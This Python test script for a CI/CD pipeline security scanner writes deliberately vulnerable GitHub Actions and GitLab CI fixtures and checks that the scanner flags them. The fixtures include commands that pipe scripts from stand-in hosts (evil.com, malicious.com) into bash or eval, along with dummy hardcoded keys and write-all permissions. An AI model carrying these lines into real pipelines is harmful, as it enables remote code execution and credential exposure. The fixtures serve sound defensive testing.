#!/usr/bin/env python3
"""
Test script for CI/CD Pipeline Guardian Agent
"""

import os
import sys
import tempfile
import shutil
from pathlib import Path

# Add the CLI to path for testing
sys.path.insert(0, str(Path(__file__).parent / "cli" / "src"))

def create_test_github_workflow():
    """Create a test GitHub workflow with various vulnerabilities"""
    workflow_content = """
name: Test CI/CD Pipeline
on:
  pull_request:  # Dangerous trigger
  workflow_dispatch:
    inputs:
      user_input:  # Default value is dangerous
        default: 'some_value'
        required: false

permissions: write-all  # Excessive permissions

jobs:
  vulnerable-job:
    uses: actions/checkout@v1  # Vulnerable action
    container: ubuntu:latest  # Mutable image tag
    
    steps:
      - name: Secret exposure
        env:
          AWS_ACCESS_KEY_ID: AKIA1234567890123456
          SECRET_PASSWORD: super-secret-password
        
      - name: Curl pipe to shell (dangerous)
        run: curl http://malicious.com/script.sh | bash
        
      - name: Run vulnerable action
        uses: actions/setup-node@v1
"""
    
    return workflow_content

def create_test_gitlab_ci():
    """Create a test GitLab CI configuration with vulnerabilities"""
    gitlab_ci_content = """
variables:
  DATABASE_PASSWORD: admin123
  API_KEY: sk_1234567890abcdef

before_script:
  - curl https://evil.com/script.sh | bash
  - eval $(curl http://malicious.com/env.sh)

deploy:
  script:
    - echo "Deploying to production"
"""
    
    return gitlab_ci_content

def test_cicd_guardian_agent():
    """Test the CI/CD Guardian Agent"""
    print("🔧 Testing CI/CD Pipeline Guardian Agent...")
    
    try:
        # Import the agent
        from alprina_cli.agents.cicd_guardian import CicdGuardianAgentWrapper
        
        # Create temporary test directory
        with tempfile.TemporaryDirectory() as temp_dir:
            test_dir = Path(temp_dir)
            
            # Create test files
            github_dir = test_dir / ".github" / "workflows"
            github_dir.mkdir(parents=True, exist_ok=True)
            
            # Create vulnerable GitHub workflow
            workflow_file = github_dir / "test.yml"
            workflow_file.write_text(create_test_github_workflow())
            
            # Create vulnerable GitLab CI
            gitlab_ci_file = test_dir / ".gitlab-ci.yml"
            gitlab_ci_file.write_text(create_test_gitlab_ci())
            
            # Test the agent
            agent = CicdGuardianAgentWrapper()
            print(f"📋 Agent '{agent.name}' loaded successfully")
            
            # Analyze the test directory
            result = agent.analyze(str(test_dir))
            
            print(f"✅ Analysis completed with status: {result.get('status')}")
            print(f"🎯 Pipeline Type: {result.get('pipeline_type')}")
            print(f"📊 Risk Score: {result.get('risk_score')}")
            print(f"🔍 Files Analyzed: {len(result.get('files_analyzed', []))}")
            print(f"⚠️  Vulnerabilities Found: {result.get('vulnerabilities_count')}")
            
            # Check vulnerabilities
            vulnerabilities = result.get('vulnerabilities', [])
            if vulnerabilities:
                print("\n🚨 Vulnerabilities Detected:")
                for i, vuln in enumerate(vulnerabilities[:5], 1):  # Show first 5
                    print(f"  {i}. [{vuln.get('severity', 'UNKNOWN').upper()}] {vuln.get('title')}")
                    print(f"     File: {vuln.get('file_path')}")
                    if vuln.get('remediation'):
                        print(f"     Fix: {vuln.get('remediation')}")
                    print()
            else:
                print("✅ No vulnerabilities detected")
            
            # Test summary
            summary = result.get('summary', {})
            if summary:
                print("📊 Vulnerability Summary:")
                print(f"  Critical: {summary.get('critical', 0)}")
                print(f"  High: {summary.get('high', 0)}")
                print(f"  Medium: {summary.get('medium', 0)}")
                print(f"  Low: {summary.get('low', 0)}")
            
            print("\n🎉 CI/CD Guardian Agent test completed successfully!")
            return True
            
    except Exception as e:
        print(f"❌ Test failed: {e}")
        import traceback
        traceback.print_exc()
        return False

if __name__ == "__main__":
    success = test_cicd_guardian_agent()
    sys.exit(0 if success else 1)
